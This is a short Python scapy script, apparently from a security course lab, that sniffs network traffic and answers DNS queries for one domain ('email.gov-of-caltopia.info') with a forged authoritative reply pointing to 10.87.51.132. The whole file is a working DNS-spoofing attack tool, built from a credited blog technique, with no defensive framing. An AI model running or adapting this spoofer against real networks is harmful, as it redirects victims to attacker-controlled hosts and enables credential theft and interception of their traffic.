#!/var/lib/python/python-q3

from scapy.config import Conf
Conf.ipv6_enabled = False
from scapy.all import *
import prctl

# This code taken from:
# http://danmcinerney.org/reliable-dns-spoofing-with-python-scapy-nfqueue/
def handle_packet(pkt):
    if pkt.haslayer(DNSQR) and pkt[DNSQR].qname == 'email.gov-of-caltopia.info.':
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata='10.87.51.132'))
        send(spoofed_pkt)
        print 'Sent:', spoofed_pkt.summary()
    

if not (prctl.cap_effective.net_admin and prctl.cap_effective.net_raw):
    print "ERROR: I must be invoked via `./pcap_tool.py`, not via `python pcap_tool.py`!"
    exit(1)


sniff(prn=handle_packet, filter='ip', iface='eth0')

